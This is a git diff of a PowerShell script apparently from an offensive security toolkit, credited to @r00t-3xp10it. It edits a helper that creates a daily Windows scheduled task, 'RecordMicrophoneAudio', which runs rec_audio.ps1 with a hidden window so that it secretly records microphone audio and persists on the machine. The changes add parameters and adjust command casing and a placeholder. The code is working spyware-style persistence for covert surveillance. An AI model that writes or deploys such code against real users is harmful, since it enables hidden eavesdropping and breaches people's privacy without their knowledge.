@@ -191,7 +191,7 @@ If($Schedule -match '^(\d{2}:\d{2})$')
    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
-      Helper - Schedule rec_audio exec to '15:43' [daily]
+      Helper - Schedule rec_audio exec to 'HH:mm' [daily]
 
    .NOTES
       The schedule task executes rec_audio.ps1 cmdlet daily at
@@ -221,7 +221,7 @@ If($Schedule -match '^(\d{2}:\d{2})$')
       write-host "RecordMicrophoneAudio" -ForegroundColor Red -NoNewline;write-host "' already exists"
 
       ## Display existing taskname settings
-      (schtasks /query /tn "RecordMicrophoneAudio") -replace 'Folder: \\',''
+      (SCHTASKS /QUERY /TN "RecordMicrophoneAudio") -replace 'Folder: \\',''
 
       If($LogFile.IsPresent)
       {
@@ -256,7 +256,7 @@ If($Schedule -match '^(\d{2}:\d{2})$')
 
    ## Create daily task that executes {hidden} rec_audio.ps1 at selected hour {$Schedule}
    If($LogFile.IsPresent){echo "[$global:CurrTime] Creating daily task to execute rec_audio.ps1" >> "$WorkingDir\ffmpeg.log"} 
-   SCHTASKS /CREATE /SC DAILY /TN "RecordMicrophoneAudio" /TR "powershell -windowstyle hidden -file $WorkingDir\rec_audio.ps1 -workingdir $WorkingDir -rectime $rectime -logfile" /ST "$Schedule"|Out-Null
+   SCHTASKS /CREATE /SC DAILY /TN "RecordMicrophoneAudio" /TR "powershell -windowstyle hidden -file $WorkingDir\rec_audio.ps1 -installer $Installer -workingdir $WorkingDir -mp3name $Mp3Name -rectime $rectime -volume $volume -logfile" /ST "$Schedule"|Out-Null
 
    Invoke-CurrentTime
    ## Make sure task was successfuly created
@@ -268,7 +268,7 @@ If($Schedule -match '^(\d{2}:\d{2})$')
    Else
    {
       If($LogFile.IsPresent){echo "[$global:CurrTime] Task Schedule to '$Schedule'" >> "$WorkingDir\ffmpeg.log"}
-      (schtasks /Query /tn "RecordMicrophoneAudio") -replace 'Folder: \\',''
+      (SCHTASKS /QUERY /TN "RecordMicrophoneAudio") -replace 'Folder: \\',''
    }
 
    write-host ""
